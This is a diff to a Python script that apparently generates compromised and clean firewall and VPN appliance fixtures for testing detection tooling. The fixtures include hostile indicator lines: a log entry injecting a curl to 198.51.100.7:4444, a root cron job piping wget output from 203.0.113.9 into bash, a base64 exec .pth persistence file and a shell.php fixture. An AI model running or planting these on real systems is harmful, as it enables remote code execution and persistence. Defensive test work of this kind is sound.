@@ -61,7 +61,8 @@ def panos(root: Path, malicious: bool) -> None:
             '{"time":"2026-10-14T06:53:09.123-07:00","message":"failed to unmarshal session(./../../../opt/panlogs/tmp/device_telemetry/minute/x) map , EOF"}',
             '{"time":"2026-10-14T06:53:41.456-07:00","message":"failed to unmarshal session(./../../../opt/panlogs/tmp/device_telemetry/minute/y`curl${IFS}198.51.100.7:4444`) map , EOF"}',
         ]
-        syslog += ["2026/10/14 07:00:01 crond[4411]: (root) CMD (wget -qO- http://203.0.113.9/policy | bash)"]
+        # No crond line here: Volexity found crond records in the TSF's
+        # /var/log/syslog-system.log, not in the `show log system` event log.
     else:
         gp += [f'{{"time":"2026-10-14T07:10:00.000-07:00","message":"failed to unmarshal session({GUID}) map , EOF"}}']
     out = dict(PANOS_COMMON)
@@ -77,8 +78,11 @@ def panos_tsf(path: Path) -> None:
     members = {
         "opt/pancfg/mgmt/python3/site-packages/system.pth":
             f"import os, base64\nexec(base64.b64decode('{blob}'))\n",
-        "var/appweb/sslvpndocs/global-protect/portal/js/jquery.min.js":
+        "var/appweb/sslvpndocs/global-protect/a1b2c3d4e5f6a7b8.css":
             '<config version="10.2.0"><mgt-config><users/></mgt-config></config>\n',
+        # crond record in the form Volexity published from syslog-system.log.
+        "var/log/syslog-system.log":
+            "Oct 14 07:00:01 fw-lab-01 crond[4411]: (root) CMD (wget -qO- http://203.0.113.9/policy | bash)\n",
         "var/log/pan/gpsvc.log":
             f'{{"time":"2026-10-14T06:51:00.000-07:00","message":"session {GUID} established"}}\n',
     }
@@ -139,6 +143,7 @@ def netscaler(root: Path, malicious: bool) -> None:
             + ("-rw-r--r--  1 nobody  wheel  301 Oct 14 07:20 .ctxs.receiver\n" if malicious else ""),
         "shell ls -la /flash/nsconfig": "total 64\n-rw-r--r--  1 root  wheel  48211 Oct 01 09:00 ns.conf\n"
             + ("drwxr-xr-x  2 root  wheel  512 Oct 14 07:21 .slap\n" if malicious else ""),
+        "shell ls -la /flash": "total 16\ndrwxr-xr-x  3 root  wheel  512 Oct 01 09:00 nsconfig\n",
         "shell ls -la /bin/sh": ("-r-sr-sr-x  1 root  wheel  168104 Jun 11  2026 /bin/sh\n" if malicious else
                                  "-r-xr-xr-x  1 root  wheel  168104 Jun 11  2026 /bin/sh\n"),
     }
@@ -172,6 +177,14 @@ def asa(root: Path, malicious: bool) -> None:
     if malicious:
         disk0.append("  57  -rwx  20480  07:30:12 Oct 14 2026  client_bundle_install.zip")
         disk0.append("  58  -rwx  1203  06:11:40 Oct 15 2026  firmware_update.log")
+        # File name from Talos's LINE RUNNER write-up (csco_config.lua creates it).
+        disk0.append("Directory of disk0:/csco_config/97/webcontent/")
+        disk0.append("  61  -rwx  512  07:30:15 Oct 14 2026  1515480F4B538B669648B17C02337098")
+    # CISA's ED 25-03 implant check. CISA publishes the command, not its output, so
+    # the hit line here is synthetic: an address, the four hex groups CISA greps
+    # for, and filler. Benign: no output, as CISA expects on a clean device.
+    text_grep = ("0x0000561da0b31c40: 55534154 41554156 41575756 488bb3a0  fixture-only\n"
+                 if malicious else "")
     # Checkheaps layout from Cisco's detection guide. Benign: the counter moves
     # between the two readings. Compromised: it stays put while time passes.
     def checkheaps(elapsed: int, runs: int) -> str:
@@ -192,6 +205,7 @@ def asa(root: Path, malicious: bool) -> None:
         "show checkheaps": ch_first,
         "show checkheaps | begin Checkheaps": ch_late,
         "show kernel process | include lina_cs": lina_cs,
+        "more /binary system:/text | grep 55534154 41554156 41575756 488bb3a0": text_grep,
         "show processes": "PC SP STATE Runtime SBASE Stack Process\n",
         "show conn count": "42 in use, 1200 most used\n",
         "show ssh sessions": "SID Client IP Version Mode Encryption\n",
@@ -221,9 +235,15 @@ def fortios(root: Path, malicious: bool) -> None:
     hashes = dict(FORTI_HASHES)
     if malicious:
         hashes["/bin/sslvpnd"] = "d" * 64
-    lang = ["drwxr-xr-x    2 0  0   0 Mar  1 10:00 .", "-rw-r--r--    1 0  0  96 Mar  1 10:00 en.json"]
-    if malicious:
-        lang.append("lrwxrwxrwx    1 0  0   1 Apr  2 03:11 x -> /")
+    # Layout of the language directory as the researcher Fortinet credits in
+    # FG-IR-25-934 shows it: one link, custom -> /data2/custom_lang.
+    lang = ["drwxr-xr-x    2 0  0   0 Mar  1 10:00 .", "-r--r--r--    1 0  0  96 Mar  1 10:00 en.json.gz",
+            ("lrwxrwxrwx    1 0  0   1 Apr  2 03:11 custom -> /" if malicious
+             else "lrwxrwxrwx    1 0  0  18 Mar  1 10:00 custom -> /data2/custom_lang")]
+    # Clean /bin rows in the format Mandiant published for `fnsysctl ls -la /bin`.
+    bin_rows = ["lrwxrwxrwx 1 0 0 Fri Sep 2 12:07:55 2022 9 lldptx -> /bin/init",
+                "-rwxr-xr-x 1 0 0 Fri Sep 2 12:07:55 2022 131736 lspci",
+                "-rwxr-xr-x 1 0 0 Fri Sep 2 12:07:55 2022 251480 sysctl"]
     out = {
         "get system status": "Version: FortiGate-VM64 v7.4.4,build2662,240514 (GA.F)\nHostname: fgt-lab-01\nSystem time: Thu Oct 22 14:02:11 2026\n",
         "diagnose sys top 1 50 1": "Run Time:  40 days, 2 hours\n sslvpnd  211  S  0.0  1.2\n",
@@ -235,8 +255,16 @@ def fortios(root: Path, malicious: bool) -> None:
         "show": "config system global\n    set hostname \"fgt-lab-01\"\nend\n",
         "diagnose debug crashlog read": ("2026-10-13 22:01:02 <00211> application sslvpnd\n2026-10-13 22:01:02 <00211> *** signal 11 (Segmentation fault) received ***\n2026-10-13 22:01:02 sslvpnd pid=211 signal 11 received\n"
                                          if malicious else "Crash log interval is 3600 seconds\n"),
-        "fnsysctl ls -la /data/lang/custom": "\n".join(lang) + "\n",
+        "fnsysctl ls -la /migadmin/lang": "\n".join(lang) + "\n",
         "fnsysctl ls -la /data": "drwxr-xr-x 2 0 0 0 Mar 1 10:00 lang\n",
+        "fnsysctl ls -l /data/lib": "-rw-r--r-- 1 0 0 4096 Mar 1 10:00 libcrypto.so\n",
+        "fnsysctl ls -la /var": "drwxr-xr-x 2 0 0 0 Mar 1 10:00 log\n",
+        "fnsysctl ls -l /data/etc": "-rw-r--r-- 1 0 0 120 Mar 1 10:00 example.conf\n",
+        "fnsysctl ls -l /": "drwxr-xr-x 2 0 0 0 Mar 1 10:00 data\n",
+        "fnsysctl ls -la /bin": "\n".join(bin_rows) + "\n",
+        "fnsysctl ls -la /data/bin": "drwxr-xr-x 2 0 0 0 Mar 1 10:00 .\n",
+        "diagnose sys tcpsock": "0.0.0.0:443->0.0.0.0:0->state=listen err=0 socktype=1 rma=0 wma=0 fma=0 tma=0 inode=1001 process=301/httpsd\n",
+        "diagnose sys process dump 1": "Name:\tinitXXXXXXXXXXX\nState:\tS (sleeping)\nGid:\t0\t0\t0\t0\n",
     }
     write_cmds(root, out)
 
@@ -307,6 +335,8 @@ def iosxe(root: Path, malicious: bool) -> None:
     logs = ["*Oct 22 13:58:01.123: %SEC_LOGIN-5-LOGIN_SUCCESS: Login Success [user: netadmin] [Source: 192.0.2.50]"]
     if malicious:
         logs += ["*Oct 14 06:51:02.441: %SYS-5-CONFIG_P: Configured programmatically by process SEP_webui_wsma_http from console as user on line",
+                 # Message layout from Cisco's advisory; documentation address.
+                 "*Oct 14 06:50:58.107: %SEC_LOGIN-5-WEBLOGIN_SUCCESS: Login Success [user: cisco_tac_admin] [Source: 203.0.113.44]",
                  "*Oct 14 06:51:40.002: %WEBUI-6-INSTALL_OPERATION_INFO: User: cisco_support, Install Operation: ADD bootflash:x.lua"]
     users = "username netadmin privilege 15 secret 9 REDACTED\n"
     if malicious:
@@ -322,6 +352,9 @@ def iosxe(root: Path, malicious: bool) -> None:
         "show platform software process memory rp active name iosd smaps": _smaps(rows),
         "show platform software process memory switch active rp active name iosd smaps":
             "show platform software process memory switch active rp active name iosd smaps\n                                         ^\n% Invalid input detected at '^' marker.\n",
+        "show platform software process memory switch active r0 active name iosd smaps":
+            "show platform software process memory switch active r0 active name iosd smaps\n                                         ^\n% Invalid input detected at '^' marker.\n",
+        "dir harddisk:/tracelogs": "\n".join(dirl[dirl.index("Directory of harddisk:/tracelogs/"):]) + "\n",
         "more bootflash:packages.conf": "#! /usr/binos/bin/packages_conf.sh\nsha1sum: 0f1e2d3c4b5a69788796a5b4c3d2e1f00f1e2d3c\nboot  rp 0 0   rp_boot   isr4400-mono-universalk9.17.09.04a.SPA.pkg\n",
         "show users": "    Line       User       Host(s)              Idle       Location\n*  2 vty 0     netadmin   idle                 00:00:00 192.0.2.50\n",
         "show iox": "IOx Infrastructure Summary:\nIOx service (CAF)  : Not Running\n",
@@ -416,7 +449,7 @@ def checkpoint(root: Path, malicious: bool) -> None:
         "uptime": " 14:02:11 up 41 days,  3:10,  1 user,  load average: 0.10, 0.12, 0.11\n",
         "fw ver": "This is Check Point's software version R82 - Build 001\n",
         "fwm ver": "This is Check Point Security Management Server R82 - Build 001\n",
-        "cpinfo -y all": "[CPFC]\n    HOTFIX_R82_JUMBO_HF_MAIN    Take:  130\n",
+        "cpinfo -d -y all": "[CPFC]\n    HOTFIX_R82_JUMBO_HF_MAIN    Take:  130\n",
         "cplp list": "LivePatch: no packages installed\n",
         "ps auxww": "USER PID %CPU COMMAND\nadmin 1 0.0 init\n",
         "netstat -anp": "Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name\n",
@@ -438,6 +471,28 @@ def checkpoint(root: Path, malicious: bool) -> None:
         vpnd += ["[vpnd 2210]@gw-lab[14 Oct 06:50:01] Suspected path traversal attack from 203.0.113.9"]
     write_files(root, {CPM: "\n".join(cpm) + "\n", VPND: "\n".join(vpnd) + "\n",
                        "/var/log/messages": "Oct 22 13:58:01 gw-lab clish[2210]: User admin logged in\n"})
+
+
+# ----------------------------------------------------------------- SonicWall SMA 100
+def sma_image(path: Path, preload: bytes | None, cf_files: bool) -> None:
+    """Offline-image triage tarball. GTIG's OVERSTEP threshold is an ld.so.preload of
+    more than 2 bytes; the file names are from GTIG's IOC table. File contents are
+    placeholders, so GTIG's published hashes never match here."""
+    members: dict[str, bytes] = {
+        "etc/rc.d/rc.fwboot": b"#!/bin/sh\n# fixture-only placeholder\n",
+        "usr/lib/libsamba-errors.so": b"fixture-only placeholder\n",
+        "cf/firmware/current/LINUX.OPT": b"fixture-only\n",
+    }
+    if preload is not None:
+        members["etc/ld.so.preload"] = preload
+    if cf_files:
+        members["cf/xxx.elf"] = b"fixture-only placeholder\n"
+        members["cf/libsamba-errors.so.6"] = b"fixture-only placeholder\n"
+    with tarfile.open(path, "w:gz") as tf:
+        for name, raw in members.items():
+            info = tarfile.TarInfo(name)
+            info.size = len(raw)
+            tf.addfile(info, io.BytesIO(raw))
 
 
 def main(out: Path) -> None:
@@ -462,6 +517,9 @@ def main(out: Path) -> None:
     (out / "iosxe-implant-check.txt").write_text("6d2f1c4e8a9b0f73\n")
     (out / "cp-85102-export.csv").write_text(
         "time,product,action,src,user_dn\n2026-09-13 02:11:00,Mobile Access,Log In,203.0.113.88,\"CN=vpn-user,OU=users,O=global\"\n")
+    sma_image(out / "sma-image-overstep.tgz", b"/usr/lib/libsamba-errors.so.6\n", True)
+    sma_image(out / "sma-image-empty-preload.tgz", b"", False)
+    sma_image(out / "sma-image-no-preload.tgz", None, False)
     (out / "shell.php").write_bytes(SHELL_PHP)
     (out / "benign.php").write_bytes(BENIGN_PHP)
 
